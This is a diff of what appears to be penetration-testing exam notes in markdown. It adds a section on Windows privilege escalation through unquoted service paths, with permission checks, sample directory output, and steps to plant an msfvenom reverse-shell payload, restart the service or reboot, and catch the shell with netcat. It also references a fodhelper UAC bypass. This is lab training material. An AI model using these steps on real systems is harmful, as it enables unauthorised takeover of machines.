@@ -369,7 +369,7 @@ run fodhelper setup and nc shell and check your priority
 ````
 C:\Windows\System32\fodhelper.exe
 ````
-### User Account Control (UAC) Bypass
+### Leveraging Unquoted Service Paths
 Another interesting attack vector that can lead to privilege escalation on Windows operating systems revolves around unquoted service paths.1 We can use this attack when we have write permissions to a service's main directory and subdirectories but cannot replace files within them. Please note that this section of the module will not be reproducible on your dedicated client. However, you will be able to use this technique on various hosts inside the lab environment.
 
 As we have seen in the previous section, each Windows service maps to an executable file that will be run when the service is started. Most of the time, services that accompany third party software are stored under the C:\Program Files directory, which contains a space character in its name. This can potentially be turned into an opportunity for a privilege escalation attack.
@@ -385,10 +385,34 @@ ZenHelpDesk                                                                     
 
 C:\Users\ted>
 ````
-check our permission and chech which part of the path you have write access to
+check our permission and chech which part of the path you have write access to.
 ````
-whoami /groups
+dir /Q
+dir /Q /S
 ````
+````
+C:\Program Files\Zen>dir /q
+ Volume in drive C has no label.
+ Volume Serial Number is 3A47-4458
+
+ Directory of C:\Program Files\Zen
+
+02/15/2021  02:00 PM    <DIR>          BUILTIN\Administrators .
+02/15/2021  02:00 PM    <DIR>          NT SERVICE\TrustedInsta..
+02/10/2021  02:24 PM    <DIR>          BUILTIN\Administrators Zen Services
+03/10/2023  12:05 PM             7,168 EXAM\ted               zen.exe
+               1 File(s)          7,168 bytes
+               3 Dir(s)   4,013,879,296 bytes free
+````
+Next we want to create a msfvenom file for a reverse shell and upload it to the folder where we have privledges over a file to write to. Start your netcat listner and check to see if you have shutdown privledges
+````
+sc stop "Some vulnerable service" #if you have permission proceed below
+sc start "Some vulnerable service"#if the above worked then start the service again
+sc qc "Some vulnerable service" #if the above failed check the privledges above "SERVICE_START_NAME"
+whoami /priv #if the above failed check to see if you have shutdown privledges
+shutdown /r /t 0 #wait for a shell to comeback
+````
+
 
 
 ## Active Directory <img src="https://www.outsystems.com/Forge_CW/_image.aspx/Q8LvY--6WakOw9afDCuuGXsjTvpZCo5fbFxdpi8oIBI=/active-directory-core-simplified-2023-01-04%2000-00-00-2023-02-07%2007-43-45" width="40" height="40" />
